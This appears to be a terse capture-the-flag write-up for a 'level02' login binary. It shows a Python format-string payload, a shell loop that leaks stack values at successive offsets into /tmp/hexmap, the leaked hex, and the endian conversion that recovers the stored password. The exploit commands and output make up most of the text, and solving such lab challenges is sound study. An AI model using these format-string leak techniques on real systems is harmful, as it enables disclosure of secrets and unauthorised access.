(python -c "print '\xff\xff\xff\xff' + '%x '*20 + '\n' + 'BBBB\n'") | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
ffffe500 0 42 2a2a2a2a 2a2a2a2a ffffe6f8 f7ff9a08 42424242 0 0 0 0 0 0 0 0 0 0 0 0  does not have access!

0x7fffffffe540 buffer fread


<pre>
#!/bin/sh
IDX=0
while [ $IDX -lt 361 ]
do
echo $IDX >> /tmp/hexmap
(python -c "print '%$IDX\$lx ' + '\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'  + '\n'") | ~/level02 | grep "access!" >> /tmp/hexmap   
IDX=$((IDX+1))
echo $IDX
done
</pre>


cat hexmap
<pre>
%0$lx  does not have access!
7fffffffe4f0  does not have access!
0  does not have access!
0  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
2a2a2a2a2a2a2a2a  does not have access!
7fffffffe6e8  does not have access!
1f7ff9a08  does not have access!
...
100000000  does not have access!
0  does not have access!
756e505234376848  does not have access!
45414a3561733951  does not have access!
377a7143574e6758  does not have access!
354a35686e475873  does not have access!
48336750664b394d  does not have access!
0  does not have access!
20786c24383225  does not have access!
...
</p14.	.	r1.	e1.	23	5.	.	>



<pre>
	little endian	 => big endian		 => big str	 => little str		
1.	756e505234376848 => 4868373452506e75 => Hh74RPnu => unPR47hH
2.	45414a3561733951 => 51397361354a4145 => Q9sa5JAE => EAJ5as9Q
3.	377a7143574e6758 => 58674e5743717a37 => XgNWCqz7 => 7zqCWNgX
4.	354a35686e475873 => 7358476e68354a35 => sXGnh5J5 => 5J5hnGXs
5.	48336750664b394d => d4394b6650673348 => M9KfPg3H => H3gPfK9M
0 => length 40

string little		=> unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
string rev little	=> H3gPfK9M5J5hnGXs7zqCWNgXEAJ5as9QunPR47hH

string big		=> Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H => VICTORY
string rev big	=> M9KfPg3HsXGnh5J5XgNWCqz7Q9sa5JAEHh74RPnu
</pre>